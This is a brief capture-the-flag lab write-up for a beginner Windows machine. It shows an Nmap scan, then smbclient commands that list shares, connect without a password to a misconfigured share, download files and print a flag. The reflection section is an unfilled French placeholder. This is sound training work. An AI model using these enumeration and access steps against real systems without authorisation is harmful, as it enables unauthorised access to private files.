# Machine Dancing — Tier 0

**Concept :** Dancing is a very easy Windows machine which introduces the Server Message Block (SMB) protocol, its enumeration and its exploitation when misconfigured to allow access without a password.
**Date :** 15 march 2026

## What I did

```bash
Nmap scan report for 10.129.21.2
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

```

List and count the shares on the machine

```bash
> smbclient -L 10.129.21.2
Password for [WORKGROUP\guillaume]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
SMB1 disabled -- no workgroup available
```


```bash
> smbclient \\10.129.21.2\WorkShares
Password for [WORKGROUP\guillaume]:

\10.129.21.2WorkShares: Not enough '\' characters in service
```

```bash
> smbclient //10.129.21.2/WorkShares
Password for [WORKGROUP\guillaume]:
Try "help" to get a list of possible commands.
smb: \> help
```

```bash
smb: \> l
  .                                   D        0  Mon Mar 29 05:22:01 2021
  ..                                  D        0  Mon Mar 29 05:22:01 2021
  Amy.J                               D        0  Mon Mar 29 06:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

		5114111 blocks of size 4096. 1753620 blocks available
smb: \> cd Amy.J\worknotes.txt 
cd \Amy.J\worknotes.txt\: NT_STATUS_NOT_A_DIRECTORY
smb: \> get Amy.J\worknotes.txt 
getting file \Amy.J\worknotes.txt of size 94 as Amy.J\worknotes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> get James.P\flag.txt 
getting file \James.P\flag.txt of size 32 as James.P\flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

```bash
> cat James.P\\flag.txt
5f61c10dffbc77a704d76016a22f1664%
```




## What I learned
Une ou deux phrases. Le concept clé retenu.